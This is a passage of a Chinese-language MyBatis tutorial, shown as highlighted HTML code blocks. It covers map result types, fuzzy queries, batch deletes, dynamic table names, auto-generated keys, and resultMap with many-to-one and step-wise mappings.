在MyBatis中，对于Java中常用的类型都设置了类型别名</span></span><br><span class="line"><span class="comment">* 例如： java.lang.Integer--&gt;int|integer</span></span><br><span class="line"><span class="comment">* 例如： int--&gt;_int|_integer</span></span><br><span class="line"><span class="comment">* 例如： Map--&gt;map,List--&gt;list</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getCount</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int getCount();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getCount&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;_integer&quot;</span>&gt;</span></span><br><span class="line">select count(id) from t_user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-4、查询一条数据为map集合"><a href="#6-4、查询一条数据为map集合" class="headerlink" title="6.4、查询一条数据为map集合"></a>6.4、查询一条数据为map集合</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 根据用户id查询用户信息为map集合</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Map&lt;String, Object&gt; <span class="title function_">getUserToMap</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> <span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Map&lt;String, Object&gt; getUserToMap(@Param(&quot;id&quot;) int id);--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--结果： &#123;password=123456, sex=男 , id=1, age=23, username=admin&#125;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserToMap&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">select * from t_user where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-5、查询多条数据为map集合"><a href="#6-5、查询多条数据为map集合" class="headerlink" title="6.5、查询多条数据为map集合"></a>6.5、查询多条数据为map集合</h2><h3 id="①方式一"><a href="#①方式一" class="headerlink" title="①方式一"></a>①方式一</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 查询所有用户信息为map集合</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">* 将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，此</span></span><br><span class="line"><span class="comment">时可以将这些map放在一个list集合中获取</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">List&lt;Map&lt;String, Object&gt;&gt; <span class="title function_">getAllUserToMap</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Map&lt;String, Object&gt; getAllUserToMap();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAllUserToMap&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">select * from t_user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②方式二"><a href="#②方式二" class="headerlink" title="②方式二"></a>②方式二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 查询所有用户信息为map集合</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">* 将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，并</span></span><br><span class="line"><span class="comment">且最终要以一个map的方式返回数据，此时需要通过<span class="doctag">@MapKey</span>注解设置map集合的键，值是每条数据所对应的</span></span><br><span class="line"><span class="comment">map集合</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@MapKey(&quot;id&quot;)</span></span><br><span class="line">Map&lt;String, Object&gt; <span class="title function_">getAllUserToMap</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Map&lt;String, Object&gt; getAllUserToMap();--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    1=&#123;password=123456, sex=男, id=1, age=23, username=admin&#125;,</span></span><br><span class="line"><span class="comment">    2=&#123;password=123456, sex=男, id=2, age=23, username=张三&#125;,</span></span><br><span class="line"><span class="comment">    3=&#123;password=123456, sex=男, id=3, age=23, username=张三&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAllUserToMap&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">select * from t_user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="7、特殊SQL的执行"><a href="#7、特殊SQL的执行" class="headerlink" title="7、特殊SQL的执行"></a>7、特殊SQL的执行</h1><h2 id="7-1、模糊查询"><a href="#7-1、模糊查询" class="headerlink" title="7.1、模糊查询"></a>7.1、模糊查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 测试模糊查询</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mohu</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">testMohu</span><span class="params">(<span class="meta">@Param(&quot;mohu&quot;)</span> String mohu)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;User&gt; testMohu(@Param(&quot;mohu&quot;) String mohu);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;testMohu&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--select * from t_user where username like &#x27;%$&#123;mohu&#125;%&#x27;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--select * from t_user where username like concat(&#x27;%&#x27;,#&#123;mohu&#125;,&#x27;%&#x27;)--&gt;</span></span><br><span class="line">select * from t_user where username like &quot;%&quot;#&#123;mohu&#125;&quot;%&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7-2、批量删除"><a href="#7-2、批量删除" class="headerlink" title="7.2、批量删除"></a>7.2、批量删除</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 批量删除</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> ids</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteMore</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> String ids)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int deleteMore(@Param(&quot;ids&quot;) String ids);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteMore&quot;</span>&gt;</span></span><br><span class="line">delete from t_user where id in ($&#123;ids&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7-3、动态设置表名"><a href="#7-3、动态设置表名" class="headerlink" title="7.3、动态设置表名"></a>7.3、动态设置表名</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 动态设置表名，查询所有的用户信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> tableName</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getAllUser</span><span class="params">(<span class="meta">@Param(&quot;tableName&quot;)</span> String tableName)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;User&gt; getAllUser(@Param(&quot;tableName&quot;) String tableName);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAllUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from $&#123;tableName&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7-4、添加功能获取自增的主键"><a href="#7-4、添加功能获取自增的主键" class="headerlink" title="7.4、添加功能获取自增的主键"></a>7.4、添加功能获取自增的主键</h2><blockquote><p>场景模拟：</p><p>t_clazz(clazz_id,clazz_name)</p><p>t_student(student_id,student_name,clazz_id)</p><p>1、添加班级信息</p><p>2、获取新添加的班级的id</p><p>3、为班级分配学生，即将某学的班级id修改为新添加的班级的id</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 添加用户信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> user</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">* useGeneratedKeys：设置使用自增的主键</span></span><br><span class="line"><span class="comment">* keyProperty：因为增删改有统一的返回值是受影响的行数，因此只能将获取的自增的主键放在传输的参数user对象的某个属性中</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">insertUser</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int insertUser(User user);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUser&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">insert into t_user values(null,#&#123;username&#125;,#&#123;password&#125;,#&#123;age&#125;,#&#123;sex&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="8、自定义映射resultMap"><a href="#8、自定义映射resultMap" class="headerlink" title="8、自定义映射resultMap"></a>8、自定义映射resultMap</h1><h2 id="8-1、resultMap处理字段和属性的映射关系"><a href="#8-1、resultMap处理字段和属性的映射关系" class="headerlink" title="8.1、resultMap处理字段和属性的映射关系"></a>8.1、resultMap处理字段和属性的映射关系</h2><blockquote><p>若字段名和实体类中的属性名不一致，则可以通过resultMap设置自定义映射</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    resultMap：设置自定义映射</span></span><br><span class="line"><span class="comment">    属性：</span></span><br><span class="line"><span class="comment">    id：表示自定义映射的唯一标识</span></span><br><span class="line"><span class="comment">    type：查询的数据要映射的实体类的类型</span></span><br><span class="line"><span class="comment">    子标签：</span></span><br><span class="line"><span class="comment">    id：设置主键的映射关系</span></span><br><span class="line"><span class="comment">    result：设置普通字段的映射关系</span></span><br><span class="line"><span class="comment">    association：设置多对一的映射关系</span></span><br><span class="line"><span class="comment">    collection：设置一对多的映射关系</span></span><br><span class="line"><span class="comment">    属性：</span></span><br><span class="line"><span class="comment">    property：设置映射关系中实体类中的属性名</span></span><br><span class="line"><span class="comment">    column：设置映射关系中表中的字段名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;userName&quot;</span> <span class="attr">column</span>=<span class="string">&quot;user_name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">column</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--List&lt;User&gt; testMohu(@Param(&quot;mohu&quot;) String mohu);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;testMohu&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--select * from t_user where username like &#x27;%$&#123;mohu&#125;%&#x27;--&gt;</span></span><br><span class="line">select id,user_name,password,age,sex from t_user where user_name likeconcat(&#x27;%&#x27;,#&#123;mohu&#125;,&#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>若字段名和实体类中的属性名不一致，但是字段名符合数据库的规则（使用_），实体类中的属性</p><p>名符合Java的规则（使用驼峰）</p><p>此时也可通过以下两种方式处理字段名和实体类中的属性的映射关系</p><p>a&gt;可以通过为字段起别名的方式，保证和实体类中的属性名保持一致</p><p>b&gt;可以在MyBatis的核心配置文件中设置一个全局配置信息mapUnderscoreToCamelCase，可</p><p>以在查询表中数据时，自动将_类型的字段名转换为驼峰</p><p>例如：字段名user_name，设置了mapUnderscoreToCamelCase，此时字段名就会转换为</p><p>userName</p></blockquote><h2 id="8-2、多对一映射处理"><a href="#8-2、多对一映射处理" class="headerlink" title="8.2、多对一映射处理"></a>8.2、多对一映射处理</h2><blockquote><p>场景模拟：</p><p>查询员工信息以及员工所对应的部门信息</p></blockquote><h3 id="8-2-1、级联方式处理映射关系"><a href="#8-2-1、级联方式处理映射关系" class="headerlink" title="8.2.1、级联方式处理映射关系"></a>8.2.1、级联方式处理映射关系</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;empDeptMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;eid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;eid&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;ename&quot;</span> <span class="attr">property</span>=<span class="string">&quot;ename&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">property</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;did&quot;</span> <span class="attr">property</span>=<span class="string">&quot;dept.did&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;dname&quot;</span> <span class="attr">property</span>=<span class="string">&quot;dept.dname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Emp getEmpAndDeptByEid(@Param(&quot;eid&quot;) int eid);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpAndDeptByEid&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;empDeptMap&quot;</span>&gt;</span></span><br><span class="line">select emp.*,dept.* from t_emp emp left join t_dept dept on emp.did =dept.did where emp.eid = #&#123;eid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-2-2、使用association处理映射关系"><a href="#8-2-2、使用association处理映射关系" class="headerlink" title="8.2.2、使用association处理映射关系"></a>8.2.2、使用association处理映射关系</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;empDeptMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;eid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;eid&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;ename&quot;</span> <span class="attr">property</span>=<span class="string">&quot;ename&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">property</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;dept&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;Dept&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;did&quot;</span> <span class="attr">property</span>=<span class="string">&quot;did&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;dname&quot;</span> <span class="attr">property</span>=<span class="string">&quot;dname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Emp getEmpAndDeptByEid(@Param(&quot;eid&quot;) int eid);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpAndDeptByEid&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;empDeptMap&quot;</span>&gt;</span></span><br><span class="line">select emp.*,dept.* from t_emp emp left join t_dept dept on emp.did =dept.did where emp.eid = #&#123;eid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-2-3、分步查询"><a href="#8-2-3、分步查询" class="headerlink" title="8.2.3、分步查询"></a>8.2.3、分步查询</h3><h4 id="①查询员工信息"><a href="#①查询员工信息" class="headerlink" title="①查询员工信息"></a>①查询员工信息</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 通过分步查询查询员工信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> eid</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Emp <span class="title function_">getEmpByStep</span><span class="params">(<span class="meta">@Param(&quot;eid&quot;)</span> <span class="type">int</span> eid)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;empDeptStepMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Emp&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;eid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;eid&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;ename&quot;</span> <span class="attr">property</span>=<span class="string">&quot;ename&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">property</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        select：设置分步查询，查询某个属性的值的sql的标识（namespace.sqlId）</span></span><br><span class="line"><span class="comment">        column：将sql以及查询结果中的某个字段设置为分步查询的条件</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;dept&quot;</span><span class="attr">select</span>=<span class="string">&quot;com.atguigu.MyBatis.mapper.DeptMapper.getEmpDeptByStep&quot;</span> <span class="attr">column</span>=<span class="string">&quot;did&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Emp getEmpByStep(@Param(&quot;eid&quot;) int eid);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getEmpByStep&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;empDeptStepMap&quot;</span>&gt;</span></span><br><span class="line">select * from t_emp where eid = #&#123;eid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="②根据员工所对应的部门id查询部门信息"><a href="#②根据员工所对应的部门id查询部门信息" class="headerlink" title="②根据员工所对应的部门id查询部门信息"></a>②根据员工所对应的部门id查询部门信息</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 分步查询的第二步： 根据员工所对应的did查询部门信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> did</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Dept <span class="title function_">getEmpDeptByStep</span><span class="params">(<span class="meta">@Param(&quot;did&quot;)</span> <span class="type">int</span> did)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 